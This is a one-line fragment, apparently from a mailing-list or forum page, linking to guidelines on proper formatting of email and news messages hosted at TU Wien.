[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


